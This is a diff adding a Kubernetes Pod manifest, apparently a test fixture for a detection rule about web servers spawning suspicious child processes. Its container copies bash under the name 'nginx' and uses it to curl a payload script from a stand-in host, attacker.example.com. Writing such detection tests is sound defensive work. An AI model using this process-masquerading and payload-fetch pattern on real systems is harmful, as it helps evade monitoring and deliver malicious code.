@@ -1,0 +1,15 @@
+#command: web server (nginx/apache) spawns suspicious child process
+#note: actor_process_name should be nginx/apache/php-fpm for full rule match
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: web-server-spawned-suspicious-child-process
+spec:
+  restartPolicy: Never
+  containers:
+  - name: web-server-spawned-suspicious-child-process
+    image: angelrita/base-ubuntu:latest
+    #imagePullPolicy: Never
+    command: ['sh']
+    args: ["-c", "cp /bin/bash nginx; ./nginx -c \"curl http://attacker.example.com/payload.sh\"; sleep infinity"]
